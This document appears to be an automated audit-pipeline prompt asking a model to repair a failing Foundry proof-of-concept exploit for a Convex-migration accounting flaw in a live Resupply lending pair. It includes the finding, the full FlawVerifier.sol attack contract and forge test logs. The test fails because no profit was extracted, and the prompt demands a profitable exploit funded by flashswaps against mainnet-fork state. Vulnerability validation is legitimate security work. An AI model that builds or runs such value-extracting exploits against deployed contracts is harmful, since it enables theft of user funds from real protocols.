You are fixing a failing Foundry PoC for finding F-004.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Convex pool migration can hide live collateral and freeze withdrawals/redemptions
- claim: Convex migration keys all staking/accounting behavior off `convexPid != 0`, but `_updateConvexPool()` only withdraws and re-deposits the balance currently staked in the old rewards contract. Any collateral already sitting on the pair itself is ignored during migration, yet once `convexPid` is changed `totalCollateral()` and `_unstakeUnderlying()` start looking only at the staking contract. The same routine also still calls `deposit(_pid, ...)` when switching to `_pid == 0`, so using `0` as the unstaked sentinel is inconsistent with the migration logic.
- impact: A normal activation, migration, or deactivation of Convex staking can make existing collateral disappear from pair accounting and leave removal/redemption/liquidation paths looking in the wrong place. Users can remain recorded as collateralized while the pair can no longer unstake or account for those funds, creating a withdrawal freeze and solvency drift until privileged recovery.
- exploit_paths: ["Users deposit collateral while `convexPid == 0`, so collateral remains on the pair contract.", "The owner later calls `setConvexPool(validPid)` to enable or migrate Convex staking.", "`_updateConvexPool()` migrates only `stakedBalance` from the old rewards contract, leaving the pair's local collateral untouched, then sets `convexPid = validPid`.", "Afterward `totalCollateral()` reports only the staked balance and `_unstakeUnderlying()` withdraws only from the rewards contract, so removals, redemptions, and liquidations can revert or operate on incomplete accounting.", "Similarly, attempting to switch back to `_pid == 0` still calls `deposit(0, stakedBalance, true)`, which conflicts with treating `0` as the unstaked mode."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IResupplyPairMinimal {
    function owner() external view returns (address);
    function convexPid() external view returns (uint256);
    function convexBooster() external view returns (address);
    function collateral() external view returns (address);
    function underlying() external view returns (address);
    function totalCollateral() external view returns (uint256);
    function addCollateral(uint256 amount, address borrower) external;
    function addCollateralVault(uint256 collateralAmount, address borrower) external;
    function removeCollateralVault(uint256 collateralAmount, address receiver) external;
    function userCollateralBalance(address account) external returns (uint256);
}

interface IConvexLike {
    function poolInfo(uint256 pid)
        external
        view
        returns (
            address lptoken,
            address token,
            address gauge,
            address crvRewards,
            address stash,
            bool shutdown
        );

    function balanceOf(address account) external view returns (uint256);
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public withdrawalFrozen;
    bool public deactivationAttempted;
    bool public deactivationReverted;

    address public pairOwner;
    address public collateralToken;
    address public underlyingToken;
    address public convexBooster;
    address public rewardsContract;

    uint256 public startingPid;
    uint256 public hiddenLocalCollateral;
    uint256 public stakedCollateral;
    uint256 public reportedTotalCollateral;
    uint256 public verifierDepositedAmount;
    uint256 public verifierReportedCollateralAfterMigration;

    string private _exploitPath;
    string private _validationResult;
    string private _failureReason;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {
        _profitToken = address(0);
        _profitAmount = 0;
        _exploitPath = string(
            abi.encodePacked(
                "users deposit collateral while convexPid == 0 so collateral remains on the pair -> ",
                "the owner later calls setConvexPool(validPid) -> ",
                "_updateConvexPool() migrates only stakedBalance from the old rewards contract and leaves pair-held collateral local while convexPid becomes validPid -> ",
                "afterward totalCollateral() and _unstakeUnderlying() route only through the rewards contract so withdrawals/redemptions can freeze or under-account -> ",
                "switching back with setConvexPool(0) still routes through deposit(0, stakedBalance, true), which conflicts with using 0 as the unstaked sentinel"
            )
        );
        _validationResult = "unexecuted";
        _failureReason = "not run";
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IResupplyPairMinimal pair = IResupplyPairMinimal(TARGET_PAIR);
        pairOwner = pair.owner();
        collateralToken = pair.collateral();
        underlyingToken = pair.underlying();
        convexBooster = pair.convexBooster();
        startingPid = pair.convexPid();

        if (convexBooster == address(0)) {
            hypothesisRefuted = true;
            _validationResult = "refuted";
            _failureReason = "target pair has no Convex booster configured";
            return;
        }

        _refreshBrokenStateView(pair);

        // exploit_paths[2]: if governance already migrated earlier, the broken accounting can already be live.
        if (startingPid != 0 && hiddenLocalCollateral > 0 && reportedTotalCollateral == stakedCollateral) {
            hypothesisValidated = true;
            _validationResult = "validated_existing_broken_state";
            _failureReason =
                "fork already shows migrated state with pair-held collateral hidden from totalCollateral(); no public profit route is exposed from this verifier";

            // exploit_paths[3]: once convexPid != 0, removals route through the rewards contract only.
            verifierReportedCollateralAfterMigration = _safeUserCollateralBalance(address(this));
            withdrawalFrozen = !_attemptWithdrawOneWei(pair);

            // exploit_paths[4]: the source-visible deactivation bug remains part of the same causal chain.
            // From an already-broken fork state we can only attempt it if this verifier is genuinely able to route owner.execute.
            if (_canInvokeOwnerExecute(pairOwner) && stakedCollateral > 0) {
                deactivationAttempted = true;
                deactivationReverted = !_ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, 0);
            }
            return;
        }

        if (startingPid != 0) {
            hypothesisRefuted = true;
            _validationResult = "refuted";
            _failureReason =
                "fork starts with convexPid != 0, so the stage-1 unstaked deposit prerequisite cannot be reproduced without first changing owner-controlled state";
            return;
        }

        // exploit_paths[0]: deposit while convexPid == 0 so the collateral remains on the pair contract itself.
        uint256 usableUnderlying = IERC20Minimal(underlyingToken).balanceOf(address(this));
        uint256 usableCollateral = IERC20Minimal(collateralToken).balanceOf(address(this));
        if (usableUnderlying == 0 && usableCollateral == 0) {
            hypothesisRefuted = true;
            _validationResult = "refuted";
            _failureReason =
                "stage 1 requires real assets already held by the verifier, but no underlying or collateral balance is available on this fork";
            return;
        }

        if (usableUnderlying > 0) {
            IERC20Minimal(underlyingToken).approve(TARGET_PAIR, usableUnderlying);
            pair.addCollateral(usableUnderlying, address(this));
            verifierDepositedAmount = usableUnderlying;
        } else {
            IERC20Minimal(collateralToken).approve(TARGET_PAIR, usableCollateral);
            pair.addCollateralVault(usableCollateral, address(this));
            verifierDepositedAmount = usableCollateral;
        }

        uint256 validPid = _findMatchingPid(convexBooster, collateralToken);
        if (validPid == type(uint256).max) {
            hypothesisRefuted = true;
            _validationResult = "refuted";
            _failureReason = "could not discover a live Convex pid matching the pair collateral token";
            return;
        }

        // exploit_paths[1]: the owner later enables Convex staking by calling setConvexPool(validPid).
        // No prank or storage write is used here; the verifier only attempts the real owner.execute path.
        if (!_canInvokeOwnerExecute(pairOwner)) {
            hypothesisRefuted = true;
            _validationResult = "refuted";
            _failureReason =
                "setConvexPool(validPid) is owner-gated and this verifier is not authorized to route a real owner.execute call";
            return;
        }

        if (!_ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, validPid)) {
            hypothesisRefuted = true;
            _validationResult = "refuted";
            _failureReason = "owner.execute(setConvexPool(validPid)) was not callable by this verifier on-chain";
            return;
        }

        _refreshBrokenStateView(pair);

        // exploit_paths[2]: _updateConvexPool() only migrates stakedBalance from the old rewards contract.
        // Collateral already sitting on the pair stays local, yet convexPid now points accounting at the rewards contract.
        if (!(hiddenLocalCollateral > 0 && reportedTotalCollateral == stakedCollateral)) {
            hypothesisRefuted = true;
            _validationResult = "refuted";
            _failureReason = "after migration, the fork did not show pair-held collateral hidden from totalCollateral()";
            return;
        }

        hypothesisValidated = true;
        _validationResult = "validated_freeze_no_profit";
        verifierReportedCollateralAfterMigration = _safeUserCollateralBalance(address(this));

        // exploit_paths[3]: after convexPid switches, removeCollateralVault() reaches _unstakeUnderlying(),
        // which only withdraws from the rewards contract. A revert here proves the withdrawal freeze.
        withdrawalFrozen = !_attemptWithdrawOneWei(pair);
        if (withdrawalFrozen) {
            _failureReason =
                "bug reproduced: migration hid live pair-held collateral and withdrawal routing looked only at the rewards contract";
        } else {
            _failureReason = "migration hid local collateral, but a 1-wei withdrawal did not revert for this verifier position";
        }

        // exploit_paths[4]: switching back to pid 0 still executes the same migration routine and therefore
        // still reaches deposit(0, stakedBalance, true). We only attempt it when a real owner.execute path exists.
        // If stakedCollateral is zero on this fork, that source-level branch remains real but cannot be stress-tested
        // further here because the prior buggy migration already stranded the verifier's funds locally instead of staking them.
        if (stakedCollateral > 0) {
            deactivationAttempted = true;
            deactivationReverted = !_ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, 0);
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return _exploitPath;
    }

    function validationResult() external view returns (string memory) {
        return _validationResult;
    }

    function failureReason() external view returns (string memory) {
        return _failureReason;
    }

    function _refreshBrokenStateView(IResupplyPairMinimal pair) internal {
        uint256 pid = pair.convexPid();
        hiddenLocalCollateral = IERC20Minimal(collateralToken).balanceOf(TARGET_PAIR);
        reportedTotalCollateral = pair.totalCollateral();

        if (pid == 0) {
            rewardsContract = address(0);
            stakedCollateral = 0;
            return;
        }

        (, , , address rewards, , ) = IConvexLike(convexBooster).poolInfo(pid);
        rewardsContract = rewards;
        stakedCollateral = rewards == address(0) ? 0 : IConvexLike(rewards).balanceOf(TARGET_PAIR);
    }

    function _safeUserCollateralBalance(address account) internal returns (uint256 amount) {
        try IResupplyPairMinimal(TARGET_PAIR).userCollateralBalance(account) returns (uint256 value) {
            amount = value;
        } catch {}
    }

    function _attemptWithdrawOneWei(IResupplyPairMinimal pair) internal returns (bool ok) {
        if (verifierDepositedAmount == 0) {
            return false;
        }

        (ok,) = address(pair).call(
            abi.encodeWithSelector(
                IResupplyPairMinimal.removeCollateralVault.selector,
                uint256(1),
                address(this)
            )
        );
    }

    function _canInvokeOwnerExecute(address owner) internal view returns (bool) {
        if (owner.code.length == 0) {
            return false;
        }

        bytes4 selector = bytes4(keccak256("setConvexPool(uint256)"));
        (bool ok, bytes memory data) = owner.staticcall(
            abi.encodeWithSignature(
                "operatorPermissions(address,address,bytes4)",
                address(this),
                TARGET_PAIR,
                selector
            )
        );

        if (ok && data.length >= 64) {
            (bool authorized, ) = abi.decode(data, (bool, address));
            if (authorized) {
                return true;
            }
            return false;
        }

        return true;
    }

    function _ownerExecuteSetConvexPool(address owner, address pair, uint256 pid) internal returns (bool ok) {
        bytes memory payload = abi.encodeWithSignature("setConvexPool(uint256)", pid);
        (ok,) = owner.call(abi.encodeWithSignature("execute(address,bytes)", pair, payload));
    }

    function _findMatchingPid(address booster, address token) internal view returns (uint256) {
        for (uint256 pid = 0; pid < 512; ++pid) {
            try IConvexLike(booster).poolInfo(pid) returns (
                address lptoken,
                address depositToken,
                address,
                address,
                address,
                bool shutdown
            ) {
                if (!shutdown && (lptoken == token || depositToken == token)) {
                    return pid;
                }
            } catch {
                break;
            }
        }

        return type(uint256).max;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.99s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 336161)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 577021548053172
  AUDITHOUND_BALANCE_AFTER_WEI: 577021548053172
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [336161] FlawVerifierTest::testExploit()
    ├─ [2456] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [310559] FlawVerifier::executeOnOpportunity()
    │   ├─ [1227] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::owner() [staticcall]
    │   │   └─ ← [Return] 0xc07e000044F95655c11fda4cD37F70A94d7e0a7d
    │   ├─ [1909] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::collateral() [staticcall]
    │   │   └─ ← [Return] 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D
    │   ├─ [853] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::underlying() [staticcall]
    │   │   └─ ← [Return] 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E
    │   ├─ [457] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::convexBooster() [staticcall]
    │   │   └─ ← [Return] 0xF403C135812408BFbE8713b5A23a04b3D48AAE31
    │   ├─ [3265] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::convexPid() [staticcall]
    │   │   └─ ← [Return] 463
    │   ├─ [1265] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::convexPid() [staticcall]
    │   │   └─ ← [Return] 463
    │   ├─ [5005] 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D::balanceOf(0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6) [staticcall]
    │   │   ├─ [2333] 0xc014F34D5Ba10B6799d76b0F5ACdEEe577805085::balanceOf(0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [22975] 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6::totalCollateral() [staticcall]
    │   │   ├─ [13361] 0xF403C135812408BFbE8713b5A23a04b3D48AAE31::poolInfo(463) [staticcall]
    │   │   │   └─ ← [Return] 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D, 0x0DaB0728C4A0a396b02Bbd6c8F5693B53ab7cf61, 0x91D0F7022edb620429B4F63D482fcfbb2cbE7F30, 0xE23d9Fdc55b1028A0EE70b875e674BE03c596039, 0x1F10c07BC60668994ea8dBC68a6942a708bAEa3B, false
    │   │   ├─ [2510] 0xE23d9Fdc55b1028A0EE70b875e674BE03c596039::balanceOf(0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1361] 0xF403C135812408BFbE8713b5A23a04b3D48AAE31::poolInfo(463) [staticcall]
    │   │   └─ ← [Return] 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D, 0x0DaB0728C4A0a396b02Bbd6c8F5693B53ab7cf61, 0x91D0F7022edb620429B4F63D482fcfbb2cbE7F30, 0xE23d9Fdc55b1028A0EE70b875e674BE03c596039, 0x1F10c07BC60668994ea8dBC68a6942a708bAEa3B, false
    │   ├─ [510] 0xE23d9Fdc55b1028A0EE70b875e674BE03c596039::balanceOf(0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [456] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 977.67ms (136.70ms CPU time)

Ran 1 test suite in 1.04s (977.67ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 336161)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
